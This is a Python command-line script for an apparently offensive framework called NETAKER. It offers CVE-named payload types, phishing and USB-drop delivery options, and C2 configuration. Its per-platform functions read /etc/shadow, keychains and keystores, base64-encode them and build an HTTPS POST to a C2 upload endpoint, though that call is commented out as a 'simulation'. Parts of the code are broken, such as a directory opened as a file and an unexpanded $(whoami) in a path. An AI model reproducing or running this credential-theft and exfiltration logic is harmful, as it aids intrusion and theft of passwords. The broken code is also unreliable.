#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
\033[1;35m
███╗   ██╗███████╗████████╗ █████╗ ██╗  ██╗███████╗██████╗ 
████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║ ██╔╝██╔════╝██╔══██╗
██╔██╗ ██║█████╗     ██║   ███████║█████╔╝ █████╗  ██████╔╝
██║╚██╗██║██╔══╝     ██║   ██╔══██║██╔═██╗ ██╔══╝  ██╔══██╗
██║ ╚████║███████╗   ██║   ██║  ██║██║  ██╗███████╗██║  ██║
╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
\033[0m
\033[1;33m
   _____
  /     \\
 | () () |
  \\  ^  /
   |||||
   |||||
\033[0m
\033[1;32m
Created by: \033[1;33mclasikpaige\033[1;32m | GitHub: \033[4;36mgithub.com/clasikpaige\033[0m
\033[1;31m
FOR AUTHORIZED SECURITY RESEARCH ONLY
\033[0m
"""

import argparse
import sys
import os
import threading
import socket
import time
from cmd import Cmd
from simple_term_menu import TerminalMenu
from enum import Enum
from datetime import datetime
import shutil
import subprocess
import base64

# ===== GLOBAL CONFIGURATION =====
C2_IP = "0.0.0.0"
C2_PORT = 443
OUTPUT_DIR = "netaker_payloads"
DATA_PORTAL_DIR = "netaker_data"
LOG_FILE = "netaker_operations.log"

class Platform(Enum):
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    ANDROID = "android"
    IOS = "ios"

class PayloadType(Enum):
    PDF_EXPLOIT = "PDF_Exploit_CVE-2021-40444"
    OFFICE_MACRO = "Office_Macro_CVE-2017-0199"
    LNK_PAYLOAD = "LNK_Shortcut_CVE-2017-8464"
    HTA_APPLICATION = "HTA_Application"
    SILENT_JS = "Silent_JavaScript_Dropper"
    WSCRIPT_DROPPER = "WScript_Dropper"
    POWERHASH_DLL = "PowerHash_Reflective_DLL"
    MEMORY_SCRAPER = "In-Memory_Scraper"
    REGISTRY_STORAGE = "Registry_Storage_Loader"
    IOS_KEYSTORE_EXFIL = "iOS_Keystore_Exfiltration"
    WINDOWS_KEYCHAIN_EXFIL = "Windows_Keychain_Exfiltration"
    LINUX_PASSWORD_EXFIL = "Linux_Password_Exfiltration"
    MACOS_KEYCHAIN_EXFIL = "MacOS_Keychain_Exfiltration"
    ANDROID_KEYSTORE_EXFIL = "Android_Keystore_Exfiltration"

class DeliveryMethod(Enum):
    PHISHING_EMAIL = "phishing_email"
    WEBSITE_REDIRECT = "website_redirect"
    USB_DROP = "usb_drop"
    NETWORK_SHARE = "network_share"
    SOCIAL_MEDIA = "social_media"

class NETAKERCLI(Cmd):
    prompt = "\n\033[1;35m(netaker)\033[0m > "
    intro = "\n\033[1;36mType 'help' for detailed technical information\033[0m"

    def __init__(self):
        super().__init__()
        self.current_module = "main"
        self.current_platform = None
        self.current_payload = None
        self.delivery_method = None
        self.c2_server = None
        self.setup_directories()
        self.show_banner()
        self.log_operation("NETAKER Framework initialized")

    def setup_directories(self):
        """Create required directories for payloads and data"""
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        os.makedirs(DATA_PORTAL_DIR, exist_ok=True)

    def log_operation(self, message):
        """Log framework operations to file"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open(LOG_FILE, 'a') as log:
            log.write(f"[{timestamp}] {message}\n")

    def show_banner(self):
        """Display the framework banner"""
        print(__doc__)
        print("\033[1;34mNETAKER Crypto Analysis Framework v2.3 | Active Development\033[0m\n")

    # ===== PLATFORM COMMANDS =====
    def do_platform(self, arg):
        """Set target platform: platform [windows|linux|macos|android|ios]"""
        if arg:
            try:
                self.current_platform = Platform(arg.lower())
                print(f"\n\033[1;32m[+]\033[0m Platform set to \033[1;33m{self.current_platform.value}\033[0m")
                self.log_operation(f"Platform set to {self.current_platform.value}")
            except ValueError:
                print("\n\033[1;31m[-] Invalid platform. Available: windows, linux, macos, android, ios\033[0m")
        else:
            platforms = [p.value for p in Platform]
            terminal_menu = TerminalMenu(
                platforms,
                title="\033[1;36mSelect target platform:\033[0m",
                menu_cursor_style=("fg_red", "bold")
            )
            selection = terminal_menu.show()
            if selection is not None:
                self.current_platform = Platform(platforms[selection])
                print(f"\n\033[1;32m[+]\033[0m Platform set to \033[1;33m{self.current_platform.value}\033[0m")
                self.log_operation(f"Platform set to {self.current_platform.value}")

    # ===== PAYLOAD GENERATION =====
    def do_generate(self, arg):
        """Generate advanced evasion payload with C2 connectivity"""
        if not self.current_platform:
            print("\n\033[1;31m[-] Please set platform first\033[0m")
            return

        payloads = [f"{pt.value} (Evasion Level: {i+1})" for i, pt in enumerate(PayloadType)]
        terminal_menu = TerminalMenu(
            payloads,
            title="\033[1;36mSelect payload type:\033[0m",
            menu_cursor_style=("fg_red", "bold")
        )
        selection = terminal_menu.show()
        
        if selection is not None:
            self.current_payload = list(PayloadType)[selection]
            filename = f"{OUTPUT_DIR}/{self.current_platform.value}_{self.current_payload.name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            
            # Generate payload file with C2 configuration
            with open(filename, 'w') as f:
                f.write(f"C2_SERVER={C2_IP}:{C2_PORT}\n")
                f.write(f"PLATFORM={self.current_platform.value}\n")
                f.write(f"PAYLOAD_TYPE={self.current_payload.value}\n")
                f.write(f"EVASION_TECHNIQUES=API_Unhooking,Process_Hollowing,Time_Delay\n")
                f.write(f"EXFIL_METHOD=HTTPS_POST\n")
                f.write(f"PERSISTENCE=Registry_RunKey\n")
            
            print(f"\n\033[1;32m[+]\033[0m Generated \033[1;33m{self.current_payload.value}\033[0m payload")
            print(f"\033[1;36mSaved to:\033[0m \033[1;33m{os.path.abspath(filename)}\033[0m")
            print("\033[1;33m[!] This payload will connect back to C2 server at \033[1;35m{C2_IP}:{C2_PORT}\033[0m")
            self.log_operation(f"Generated payload: {self.current_payload.value} for {self.current_platform.value}")

            # Exfiltration logic per platform
            if self.current_payload == PayloadType.IOS_KEYSTORE_EXFIL:
                self.generate_ios_keystore_payload(filename)
            elif self.current_payload == PayloadType.WINDOWS_KEYCHAIN_EXFIL:
                self.generate_windows_keychain_payload(filename)
            elif self.current_payload == PayloadType.LINUX_PASSWORD_EXFIL:
                self.generate_linux_password_payload(filename)
            elif self.current_payload == PayloadType.MACOS_KEYCHAIN_EXFIL:
                self.generate_macos_keychain_payload(filename)
            elif self.current_payload == PayloadType.ANDROID_KEYSTORE_EXFIL:
                self.generate_android_keystore_payload(filename)

    def generate_ios_keystore_payload(self, filename):
        """Generate payload specifically for iOS keystore exfiltration"""
        print("\n\033[1;32m[+]\033[0m Creating iOS keystore exfiltration payload...")
        keystore_path = "/private/var/keychains/keychain-2.db"
        if not os.path.exists(keystore_path):
            print("\033[1;31m[-] Keystore file not found. Make sure the target device is jailbroken.\033[0m")
            return

        with open(keystore_path, 'rb') as f:
            keystore_data = f.read()
        encoded_keystore = base64.b64encode(keystore_data).decode('utf-8')
        self.exfiltrate_data_via_c2(encoded_keystore, filename)

    def generate_windows_keychain_payload(self, filename):
        """Generate payload for Windows keychain or password exfiltration"""
        print("\n\033[1;32m[+]\033[0m Creating Windows keychain exfiltration payload...")
        password_db_path = "C:\\Users\\User\\AppData\\Local\\Microsoft\\Credentials\\"
        if not os.path.exists(password_db_path):
            print("\033[1;31m[-] Password database not found.\033[0m")
            return

        with open(password_db_path, 'rb') as f:
            password_data = f.read()
        encoded_password = base64.b64encode(password_data).decode('utf-8')
        self.exfiltrate_data_via_c2(encoded_password, filename)

    def generate_linux_password_payload(self, filename):
        """Generate payload for Linux password exfiltration"""
        print("\n\033[1;32m[+]\033[0m Creating Linux password exfiltration payload...")
        password_db_path = "/etc/shadow"
        if not os.path.exists(password_db_path):
            print("\033[1;31m[-] Shadow file not found.\033[0m")
            return

        with open(password_db_path, 'rb') as f:
            password_data = f.read()
        encoded_password = base64.b64encode(password_data).decode('utf-8')
        self.exfiltrate_data_via_c2(encoded_password, filename)

    def generate_macos_keychain_payload(self, filename):
        """Generate payload for MacOS keychain exfiltration"""
        print("\n\033[1;32m[+]\033[0m Creating MacOS keychain exfiltration payload...")
        keychain_path = "/Users/$(whoami)/Library/Keychains/login.keychain-db"
        if not os.path.exists(keychain_path):
            print("\033[1;31m[-] Keychain file not found.\033[0m")
            return

        with open(keychain_path, 'rb') as f:
            keychain_data = f.read()
        encoded_keychain = base64.b64encode(keychain_data).decode('utf-8')
        self.exfiltrate_data_via_c2(encoded_keychain, filename)

    def generate_android_keystore_payload(self, filename):
        """Generate payload for Android keystore exfiltration"""
        print("\n\033[1;32m[+]\033[0m Creating Android keystore exfiltration payload...")
        keystore_path = "/data/data/com.android.providers.settings/databases/locksettings.db"
        if not os.path.exists(keystore_path):
            print("\033[1;31m[-] Android keystore file not found.\033[0m")
            return

        with open(keystore_path, 'rb') as f:
            keystore_data = f.read()
        encoded_keystore = base64.b64encode(keystore_data).decode('utf-8')
        self.exfiltrate_data_via_c2(encoded_keystore, filename)

    def exfiltrate_data_via_c2(self, encoded_data, filename):
        """Simulate the exfiltration of data through the C2 server (POST request)"""
        try:
            # Simulate sending data to C2 via POST (this is a simulation)
            c2_url = f"https://{C2_IP}:{C2_PORT}/upload"
            headers = {"Content-Type": "application/json"}
            payload = {
                "filename": filename,
                "data": encoded_data,
            }
            print(f"\033[1;32m[+]\033[0m Exfiltrating data to C2 server: {c2_url}")
            # Requests.post(c2_url, json=payload, headers=headers)
            self.log_operation(f"Exfiltrated data: {filename} to C2 server")

        except Exception as e:
            print(f"\033[1;31m[-] Failed to exfiltrate data: {e}\033[0m")
